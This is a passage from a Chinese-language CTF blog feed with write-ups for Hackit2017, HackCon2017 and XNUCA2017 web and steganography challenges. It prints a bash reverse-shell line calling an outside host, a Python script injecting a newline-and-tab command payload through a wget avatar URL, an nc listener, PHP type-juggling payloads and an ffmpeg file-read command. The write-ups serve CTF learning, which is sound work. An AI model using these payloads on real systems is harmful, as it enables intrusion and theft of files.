<p>而$url是我们可以控制的，那可以尝试注入比如换行符，比如令<code>$URL=http://xx.com/a.jpg\nwhoami</code>，让后端执行时变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget  -r -P avatars  -A &apos;*.jpg,*.png,*.gif&apos; http://xx.com/a.jpg</div><div class="line">whoami</div></pre></td></tr></table></figure></p>
<p>从而导致命令注入。经过fuzz，换行符<code>\n</code>没有过滤，制表符<code>\t</code>没有过滤可用来代替空格。</p>
<p>我们在自己的服务器上放一个jpg文件，之所以用jpg做后缀是因为在wget完后，wget命令会检测指定后缀名，若不是，则会删掉。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/9.png?raw=true" alt=""></p>
<p>其内容是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/yourhost/port 0&lt;&amp;1 2&gt;&amp;1</div></pre></td></tr></table></figure></p>
<p>服务器端将使用wget将图片下载到 avatars/yourhost/xx.jpg 的位置，然后我们再利用bash去加载avatars/yourhost/xx.jpg来获得一个shell。最后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">cookie = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"uchf0tsmo9fnpvgjllo67kr9k1"</span>&#125;</div><div class="line"></div><div class="line">payload = <span class="string">"http://yourhost/chybeta.jpg\nbash\tavatars/yourhost/chybeta.jpg"</span></div><div class="line"></div><div class="line">url = <span class="string">"http://tasks.ctf.com.ua:13374/profile.php"</span></div><div class="line"></div><div class="line">data = &#123;<span class="string">"password"</span>:<span class="string">""</span>,<span class="string">"new_password"</span>:<span class="string">""</span>,<span class="string">"avatar_url"</span>:payload&#125;</div><div class="line"></div><div class="line">requests.post(url,cookies=cookie,data=data)</div></pre></td></tr></table></figure>
<p>然后在自己的服务器上监听端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -vv -l -p 24853</div></pre></td></tr></table></figure></p>
<p>运行python脚本，得到shell。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/10.png?raw=true" alt=""></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;h4ck1t&#123;wg3t_cv3_1n_CTF&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h1><p>wget的版本是1.15，这个在pwnhub-another-php中出现过，利用<a href="https://www.cvedetails.com/cve/CVE-2016-7098/" target="_blank" rel="external">CVE-2016-7098</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Race condition in wget 1.17 and earlier, when used in recursive or mirroring mode to download a single file, might allow remote servers to bypass intended access list restrictions by keeping an HTTP connection open.</div></pre></td></tr></table></figure></p>
<p>参考文章：<a href="https://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html" target="_blank" rel="external">Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098</a></p>
<p>也就是说利用竞争条件，在wget的链接还没结束前，它对后缀名的检测就不会触发，这样赶在这段时间内服务器wget后的webshell其实是存在的。</p>
<p>但我没成功。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-B3tterS0ci4lN3twork-writeup&lt;br&gt;命令注入&lt;br&gt;wget-cve利用&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>HackCon2017-Steg-writeup</title>
    <link href="http://yoursite.com/2017/08/27/HackCon2017-Steg-writeup/"/>
    <id>http://yoursite.com/2017/08/27/HackCon2017-Steg-writeup/</id>
    <published>2017-08-27T02:04:53.000Z</published>
    <updated>2017-08-28T10:51:49.882Z</updated>
    
    <content type="html"><![CDATA[<p>HackCon2017-Steg-writeup<br><a id="more"></a></p>
<h1 id="Standard-Steg"><a href="#Standard-Steg" class="headerlink" title="Standard Steg"></a>Standard Steg</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">I hacked my friend&apos;s facebook, by seeing his chrome password. I am smart, right?</div><div class="line">Anyways, he sent this image to one of his friends, idk what it is, looks like a useless logo, can you check?</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">asciiToBin</span><span class="params">(ascii)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">''</span>.join(str(bin(ord(byte)))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> ascii)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hide</span><span class="params">(img, data, outName)</span>:</span></div><div class="line">	header, trailer = <span class="number">2</span>*<span class="string">"11001100"</span>,<span class="number">2</span>*<span class="string">"0101010100000000"</span></div><div class="line">	dataBin = header+asciiToBin(data)+trailer</div><div class="line">	pixels, mode = list(img.getdata()), img.mode</div><div class="line">	newPixels = []</div><div class="line"></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(dataBin)):</div><div class="line">		newPixel = list(pixels[i])</div><div class="line">		newPixel[i%len(mode)] = setLSB(newPixel[i%len(mode)], dataBin[i])</div><div class="line">		newPixels.append(tuple(newPixel))</div><div class="line"></div><div class="line">	newData = newPixels + pixels[len(newPixels):]</div><div class="line"></div><div class="line">	img.putdata(newData)</div><div class="line">	img.save(outName, <span class="string">"PNG"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setLSB</span><span class="params">(target, value)</span>:</span></div><div class="line">	binary = str(bin(target))[<span class="number">2</span>:]</div><div class="line">	<span class="keyword">if</span> binary[<span class="number">-1</span>] != value:</div><div class="line">		binary = binary[:<span class="number">-1</span>] + value</div><div class="line">	<span class="keyword">return</span> int(binary, <span class="number">2</span>)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HackCon2017-Steg-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>HackCon2017-Web-writeup</title>
    <link href="http://yoursite.com/2017/08/27/HackCon2017-Web-writeup/"/>
    <id>http://yoursite.com/2017/08/27/HackCon2017-Web-writeup/</id>
    <published>2017-08-27T00:35:47.000Z</published>
    <updated>2017-08-28T10:52:17.356Z</updated>
    
    <content type="html"><![CDATA[<p>HackCon2017-Web-writeup<br><a id="more"></a></p>
<h1 id="Noobcoder"><a href="#Noobcoder" class="headerlink" title="Noobcoder"></a>Noobcoder</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">A junior recently started doing PHP, and makes some random shit. He uses gedit as his go-to editor with a black theme thinking it was sublime.</div><div class="line">So he made this login portal, I am sure he must have left something out. Why don&apos;t you give it a try?</div><div class="line">Server: http://defcon.org.in:6062</div><div class="line"></div><div class="line">Note: dirbuster is NOT required for this question</div></pre></td></tr></table></figure>
<p>存在文件<code>checker.php~</code>，下载下来后打开：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> ($_POST[<span class="string">"username"</span>] == $_POST[<span class="string">"password"</span>] &amp;&amp; $_POST[<span class="string">"password"</span>] !== $_POST[<span class="string">"username"</span>])</div><div class="line">	<span class="keyword">echo</span> <span class="string">"congratulations the flag is d4rk&#123;TODO&#125;c0de"</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line">	<span class="keyword">echo</span> <span class="string">"nice try, but try again"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>存在弱类型比较问题，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=0e1&amp;password=0e2</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170827/1.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d4rk&#123;l0l_g3dit_m4ster_roxx&#125;c0de</div></pre></td></tr></table></figure></p>
<h1 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Everything disappears magically.</div><div class="line">Can you magically prevent that?</div><div class="line">http://defcon.org.in:6060/index.php</div><div class="line"></div><div class="line">Note: dirbuster is NOT required for this question</div></pre></td></tr></table></figure>
<p>有一个登陆框，但初尝后没有发现注入。</p>
<p>抓包看看，有一些奇怪的set-cookie：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170827/2.png?raw=true" alt=""></p>
<p>将所有的setcookie保存到cookie.txt中，用脚本将其中的字符提取出来：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</div><div class="line"></div><div class="line">content = open(<span class="string">"cookie.txt"</span>,<span class="string">"rb"</span>).read()</div><div class="line">reg = <span class="string">r'=(.+?); expires='</span></div><div class="line">cookiere = re.compile(reg)</div><div class="line">cookielist = re.findall(cookiere,content)</div><div class="line"></div><div class="line">result = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cookielist:</div><div class="line">	result += unquote(i)</div><div class="line"></div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure></p>
<p>运行后得到：<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span></div></pre></td></tr></table></figure></p>
<p>用brainfuck编译器解释后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">λ .\brainfuck.exe</div><div class="line">username: abERsdhw password: HHealskdwwpr</div></pre></td></tr></table></figure></p>
<p>得到用户名和密码，登陆，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d4rk&#123;c00k13s_4r3_fun&#125;c0de</div></pre></td></tr></table></figure></p>
<h1 id="Dictator"><a href="#Dictator" class="headerlink" title="Dictator"></a>Dictator</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">A dictator is creating a lot of fuss nowadays by claiming to have nuclear weapons. I somehow got access to his personal website that he uses to send instructions, but I cannot get in. Can you try?</div><div class="line"></div><div class="line">Link: Website(http://defcon.org.in:6063/)</div><div class="line"></div><div class="line">Hint: you need to be living in that country to get access.</div><div class="line">Hint2: north korea</div></pre></td></tr></table></figure>
<p>直接访问会说：Access denied</p>
<p>根据hint，对国家有要求。一般在ctf中这通过修改Accept-Language来绕过。</p>
<h1 id="Stolen-Calculator-PWN"><a href="#Stolen-Calculator-PWN" class="headerlink" title="Stolen Calculator - PWN"></a>Stolen Calculator - PWN</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">I stole this calculator from someone and made some changes because I am the plagiarism god. Bow before me now.</div><div class="line">btw wanna try it: http://defcon.org.in:9080/</div><div class="line">Hint: This is a pwn challenge</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HackCon2017-Web-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA2017-第一期：Web-writeup</title>
    <link href="http://yoursite.com/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/"/>
    <id>http://yoursite.com/2017/08/26/XNUCA2017-第一期：Web-writeup/</id>
    <published>2017-08-26T00:32:34.000Z</published>
    <updated>2017-08-28T10:49:51.974Z</updated>
    
    <content type="html"><![CDATA[<p>XNUCA2017-第一期：Web-writeup 难度中等偏下</p>
<p>题目类型：CTF题，渗透/模板题<br><a id="more"></a></p>
<h1 id="No-1-你喜欢颜文字么"><a href="#No-1-你喜欢颜文字么" class="headerlink" title="No.1 你喜欢颜文字么"></a>No.1 你喜欢颜文字么</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">关键字词：一档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">Lloowweerrxx是个喜欢用代码仓库的好孩子</div><div class="line"></div><div class="line">f3e6cc87187fe797bf8c89e7688c1039.xnuca.cn</div></pre></td></tr></table></figure>
<p>看到代码仓库，想到github，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/lloowweerrxx/</div></pre></td></tr></table></figure></p>
<p>发现有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$safeanswer = $_POST[<span class="string">'safeanswer'</span>];</div><div class="line">$safequestion = $_POST[<span class="string">'safequestion'</span>];</div><div class="line">$turequestion = intval(<span class="number">0</span>);</div><div class="line">$tureanswer = intval(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($safequestion))&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"安全问题不能为空！"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($safeanswer))&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"安全问题答案不能为空！"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($tureanswer == $safeanswer &amp;&amp; $turequestion == $safequestion)&#123;</div><div class="line">	<span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/4.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;921e440934d87e45f37e3ec2081f9735&#125;</div></pre></td></tr></table></figure></p>
<h1 id="No-2-让你无语的md5"><a href="#No-2-让你无语的md5" class="headerlink" title="No.2 让你无语的md5"></a>No.2 让你无语的md5</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">关键字词：一档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">Pav1遇到不会的md5很喜欢去百度一下无语的md5</div><div class="line"></div><div class="line">e5a5dc7404c4e4dad32e4556ac2588b6.xnuca.cn</div></pre></td></tr></table></figure>
<p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!--pav1和lloowweerrxx经常因为用同一个账号而吵起来--&gt;</div><div class="line">&lt;!--pav1建数据库喜欢用默认的latin1，lloowweerrxx写程序的时候set了一下utf8,他们好像又吵起来啦--&gt;</div></pre></td></tr></table></figure></p>
<p>输入：<code>admin</code><br>(即admin后面有好多空格)，得到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/6.png?raw=true" alt=""></p>
<p>然后去 <a href="https://somd5.com/" target="_blank" rel="external">https://somd5.com/</a> 查询，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;0c7b5781935082833f6487a69d81404b&#125;</div></pre></td></tr></table></figure></p>
<h1 id="No-3-Pav1和lloowweerr…"><a href="#No-3-Pav1和lloowweerr…" class="headerlink" title="No.3 Pav1和lloowweerr…"></a>No.3 Pav1和lloowweerr…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">关键字词：二档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">听说pav1不小心放了一个flag文件在/home/user下，而且忘了加扩展名</div><div class="line"></div><div class="line">9f264492ec95b853dec810609f875c3b.xnuca.cn</div></pre></td></tr></table></figure>
<p>很明显，ffmpeg任意文件读取漏洞，参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.freebuf.com/column/142775.html</div></pre></td></tr></table></figure></p>
<p>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 gen_xbin_avi.py file:///home/user/flag chybeta.avi</div></pre></td></tr></table></figure></p>
<p>然后上传到网站上，最后下载下来</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/7.png?raw=true" alt=""></p>
<p>观看</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/8.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;7bed46c5c61c0ac625cebf8a9922cc48&#125;</div></pre></td></tr></table></figure>
<h1 id="No-4-X-NUCA-2017’s-S…"><a href="#No-4-X-NUCA-2017’s-S…" class="headerlink" title="No.4 X-NUCA 2017’s S…"></a>No.4 X-NUCA 2017’s S…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">关键字词：二档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">X-NUCA 2017’s Secrets</div><div class="line"></div><div class="line">a4b359466421ae3aa76a8b116dda3870.xnuca.cn</div></pre></td></tr></table></figure>
<p>这个没做出来。</p>
